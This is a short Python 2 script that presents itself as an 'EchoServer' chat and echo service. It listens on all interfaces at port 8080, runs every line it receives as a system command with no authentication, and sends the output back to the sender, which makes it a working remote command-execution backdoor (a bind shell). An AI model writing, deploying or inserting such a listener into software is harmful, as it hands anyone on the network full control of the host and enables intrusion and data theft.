#!/usr/bin/python
import asyncore
import socket
import subprocess


class EchoHandler(asyncore.dispatcher_with_send):
    def handle_read(self):
        data = self.recv(8192)
        if data:
            print("command to exectue: %s, %d" % (data, len(data.strip())))
            if not len(data.strip()) <= 0:
                self.exec_cmd(data)

    def create_file(self, fn):
        path = "/tmp/"
        fn = path + fn
        fo = open(fn, 'w')
        fo.close()

    def exec_cmd(self, data):
        try:
            output = subprocess.check_output(list(str(data).strip().split()))
            self.send(output)
        except Exception as ex:
            template = "An exception of type {0} occured. Arguments: {1!r}\n"
            message = template.format(type(ex).__name__, ex.args)
            self.send(message)

    def broadcast(self, data):
        for user in users:
            if user[1] != self.addr:
                user[0].send("\n" + str(self.addr[0]) + ":" +
                             str(self.addr[1]) + " Said: " + data)
                user[0].send("Say something>>>")


class EchoServer(asyncore.dispatcher):

    global users
    users = []

    def __init__(self, host, port):
        asyncore.dispatcher.__init__(self)
        self.create_socket(socket.AF_INET, socket.SOCK_STREAM)
        self.set_reuse_addr()
        self.bind((host, port))
        self.listen(5)

    def handle_accept(self):
        pair = self.accept()
        if pair is not None:
            users.append(pair)
            sock, addr = pair
            print 'Incoming connection from %s' % repr(addr)
            handler = EchoHandler(sock)


server = EchoServer('0.0.0.0', 8080)
server.debug = True
asyncore.loop()
